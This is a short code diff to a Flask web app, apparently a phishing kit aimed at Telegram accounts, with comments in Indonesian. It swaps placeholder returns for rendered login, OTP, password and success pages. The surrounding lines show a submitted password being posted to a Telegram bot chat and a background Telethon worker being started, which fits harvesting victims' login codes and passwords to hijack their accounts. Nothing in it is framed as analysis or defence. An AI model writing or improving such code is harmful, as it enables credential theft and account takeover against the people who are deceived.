@@ -50,7 +50,7 @@ def login():
             flash(f"Error: {str(e)}")
             return redirect(url_for("login"))
 
-    return "Form login.html"  # ganti render_template sesuai template kamu
+    return render_template("login.html")  # render template
 
 @app.route("/otp", methods=["GET", "POST"])
 def otp():
@@ -89,7 +89,7 @@ def otp():
             flash(f"Error lain: {e}")
             return redirect(url_for("otp"))
 
-    return "Form otp.html"  # ganti render_template sesuai template kamu
+    return render_template("otp.html")  # render template
 
 @app.route("/password", methods=["GET", "POST"])
 def password():
@@ -107,11 +107,14 @@ def password():
         requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
         flash("Password berhasil dimasukkan (manual).")
         return redirect(url_for("success"))
-    return "Form password.html"  # ganti render_template sesuai template kamu
+    return render_template("password.html")  # render template
 
 @app.route("/success")
 def success():
-    return f"Success {session.get('name')} - {session.get('phone')}"
+    return render_template("success.html",
+                           name=session.get('name'),
+                           phone=session.get('phone'),
+                           gender=session.get('gender'))
 
 # ============================
 #  WORKER TELETHON
@@ -157,5 +160,3 @@ threading.Thread(target=start_worker_background, daemon=True).start()
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
-
-
